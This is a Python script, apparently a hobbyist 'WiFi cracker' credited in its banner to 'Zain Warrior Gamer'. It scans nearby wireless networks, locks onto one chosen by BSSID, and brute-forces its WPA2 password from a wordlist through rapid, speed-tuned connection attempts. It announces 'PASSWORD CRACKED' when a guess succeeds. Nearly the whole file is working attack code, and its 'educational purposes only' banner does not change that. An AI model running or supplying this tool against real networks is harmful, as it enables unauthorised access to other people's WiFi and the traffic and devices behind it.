import pywifi
from pywifi import const
import time
import os
from colorama import Fore, Back, Style, init

# Initialize colorama for Windows
init(autoreset=True)

def get_wifi_interface():
    """Get the first WiFi interface"""
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    return iface

def scan_networks(iface):
    """Scan for available networks"""
    iface.scan()
    time.sleep(3)
    return iface.scan_results()

def display_available_networks(iface):
    """Display all available networks"""
    networks = scan_networks(iface)
    print(f"\n{Fore.GREEN}[+] Found {Fore.YELLOW}{len(networks)}{Fore.GREEN} networks:")
    print(f"{Fore.CYAN}{'━' * 90}")
    for i, network in enumerate(networks, 1):
        auth_type = "WPA2" if network.akm and network.akm[0] == const.AKM_TYPE_WPA2PSK else "WPA" if network.akm and network.akm[0] == const.AKM_TYPE_WPAPSK else "Open"
        print(f"{Fore.WHITE}{i}. {Fore.GREEN}SSID: {Fore.YELLOW}{network.ssid:20} {Fore.CYAN}| BSSID: {Fore.MAGENTA}{network.bssid} {Fore.CYAN}| Signal: {Fore.WHITE}{network.signal} {Fore.CYAN}| Auth: {Fore.RED}{auth_type}")
    print(f"{Fore.CYAN}{'━' * 90}")
    return networks

def get_network_details(bssid, networks):
    """Get details of a specific network by BSSID"""
    # Normalize BSSID format
    bssid_normalized = bssid.lower().replace("-", ":").strip()
    
    for network in networks:
        network_bssid = network.bssid.lower().replace("-", ":").strip()
        if network_bssid == bssid_normalized:
            print(f"\n{Fore.GREEN + Style.BRIGHT}[+] Target Network Locked!")
            print(f"{Fore.CYAN}    ├─ SSID: {Fore.YELLOW}{network.ssid}")
            print(f"{Fore.CYAN}    ├─ BSSID: {Fore.MAGENTA}{network.bssid}")
            print(f"{Fore.CYAN}    ├─ Signal: {Fore.WHITE}{network.signal}")
            print(f"{Fore.CYAN}    ├─ Frequency: {Fore.WHITE}{network.freq}")
            auth_type = "WPA2" if network.akm and network.akm[0] == const.AKM_TYPE_WPA2PSK else "WPA" if network.akm and network.akm[0] == const.AKM_TYPE_WPAPSK else "Open"
            print(f"{Fore.CYAN}    └─ Auth Type: {Fore.RED}{auth_type}")
            return network
    return None

def try_connect(iface, network, password):
    """Try to connect with a given password - OPTIMIZED FOR SPEED"""
    iface.disconnect()
    time.sleep(0.1)  # Reduced from 0.5
    
    profile = pywifi.Profile()
    profile.ssid = network.ssid
    profile.bssid = network.bssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    
    # Faster check with multiple attempts
    for _ in range(15):  # Check 15 times over 1.5 seconds instead of waiting 3 seconds
        time.sleep(0.1)
        status = iface.status()
        if status == const.IFACE_CONNECTED:
            return True
        elif status == const.IFACE_DISCONNECTED:
            # Failed quickly, no need to wait
            return False
    
    return False

def print_banner():
    """Display hacker-themed banner"""
    banner = f"""
{Fore.GREEN + Style.BRIGHT}
╦ ╦╦╔═╗╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
║║║║╠╣ ║  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝
╚╩╝╩╚  ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{Fore.RED + Style.BRIGHT}
 ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗██████╗     ██████╗ ██╗   ██╗
██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
██║     ██████╔╝█████╗  ███████║   ██║   █████╗  ██║  ██║    ██████╔╝ ╚████╔╝ 
██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝  
╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██████╔╝    ██████╔╝   ██║   
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═════╝    ╚═╝   

{Fore.YELLOW + Style.BRIGHT}
███████╗ █████╗ ██╗███╗   ██╗    ██╗    ██╗ █████╗ ██████╗ ██████╗ ██╗ ██████╗ ██████╗ 
╚══███╔╝██╔══██╗██║████╗  ██║    ██║    ██║██╔══██╗██╔══██╗██╔══██╗██║██╔═══██╗██╔══██╗
  ███╔╝ ███████║██║██╔██╗ ██║    ██║ █╗ ██║███████║██████╔╝██████╔╝██║██║   ██║██████╔╝
 ███╔╝  ██╔══██║██║██║╚██╗██║    ██║███╗██║██╔══██║██╔══██╗██╔══██╗██║██║   ██║██╔══██╗
███████╗██║  ██║██║██║ ╚████║    ╚███╔███╔╝██║  ██║██║  ██║██║  ██║██║╚██████╔╝██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝

{Fore.MAGENTA + Style.BRIGHT}
 ██████╗  █████╗ ███╗   ███╗███████╗██████╗ 
██╔════╝ ██╔══██╗████╗ ████║██╔════╝██╔══██╗
██║  ███╗███████║██╔████╔██║█████╗  ██████╔╝
██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝

{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.GREEN + Style.BRIGHT}[*] WiFi Penetration Testing Tool
{Fore.YELLOW}[*] For Educational Purposes Only
{Fore.RED}[!] Use Responsibly - Unauthorized Access is Illegal
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Style.RESET_ALL}
"""
    print(banner)

def main():
    print_banner()
    
    # Get WiFi interface
    try:
        iface = get_wifi_interface()
        print(f"{Fore.GREEN}[+] Using interface: {Fore.CYAN}{iface.name()}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting WiFi interface: {e}")
        return
    
    # Scan and display all networks
    print(f"\n{Fore.YELLOW}[*] Scanning for networks...")
    networks = display_available_networks(iface)
    
    if not networks:
        print(f"{Fore.RED}[-] No networks found!")
        return
    
    # Get BSSID from user
    bssid = input(f"\n{Fore.CYAN}[?] Enter the BSSID (MAC address) of the WiFi network: {Fore.WHITE}").strip()
    
    # Get network details
    network = get_network_details(bssid, networks)
    
    if not network:
        print(f"{Fore.RED}[-] Network with BSSID {bssid} not found in scan results!")
        print(f"{Fore.YELLOW}[!] Make sure the BSSID is correct and the network is in range.")
        return
    
    # Get wordlist path
    wordlist_path = input(f"\n{Fore.CYAN}[?] Enter the path to wordlist.txt: {Fore.WHITE}").strip()
    
    # Remove quotes if user copied path with quotes
    wordlist_path = wordlist_path.strip('"').strip("'")
    
    # Try to find the file
    if not os.path.exists(wordlist_path):
        # Try in current directory
        if os.path.exists(os.path.join(os.getcwd(), wordlist_path)):
            wordlist_path = os.path.join(os.getcwd(), wordlist_path)
        # Try just the filename
        elif os.path.exists(os.path.basename(wordlist_path)):
            wordlist_path = os.path.basename(wordlist_path)
        else:
            print(f"{Fore.RED}[-] Wordlist file not found: {wordlist_path}")
            print(f"{Fore.YELLOW}[!] Current directory: {os.getcwd()}")
            print(f"{Fore.YELLOW}[!] Make sure the file exists or provide full path")
            return
    
    # Read passwords from wordlist
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Error reading wordlist: {e}")
        return
    
    print(f"\n{Fore.GREEN}[+] Loaded {Fore.YELLOW}{len(passwords)}{Fore.GREEN} passwords from wordlist")
    print(f"{Fore.YELLOW}[*] Starting password attempts...")
    print(f"{Fore.MAGENTA}[*] TURBO MODE ACTIVATED - Maximum Speed! 🚀\n")
    
    start_time = time.time()
    
    # Try each password
    for i, password in enumerate(passwords, 1):
        elapsed = time.time() - start_time
        speed = i / elapsed if elapsed > 0 else 0
        print(f"{Fore.CYAN}[{i}/{len(passwords)}] {Fore.WHITE}Trying: {Fore.YELLOW}{password:20} {Fore.GREEN}| Speed: {speed:.1f} pwd/s        ", end='\r')
        
        if try_connect(iface, network, password):
            print(f"\n\n{Fore.GREEN + Style.BRIGHT}{'=' * 60}")
            print(f"{Fore.GREEN}╔═══════════════════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║  {Fore.YELLOW + Style.BRIGHT}★ ★ ★  SUCCESS! PASSWORD CRACKED!  ★ ★ ★{Fore.GREEN}           ║")
            print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════════╝")
            print(f"{Fore.WHITE}Password: {Fore.RED + Style.BRIGHT}{password}")
            print(f"{Fore.GREEN}{'=' * 60}{Style.RESET_ALL}\n")
            return
    
    print(f"\n\n{Fore.RED}[-] Password not found in wordlist")
    iface.disconnect()

if __name__ == "__main__":
    main()
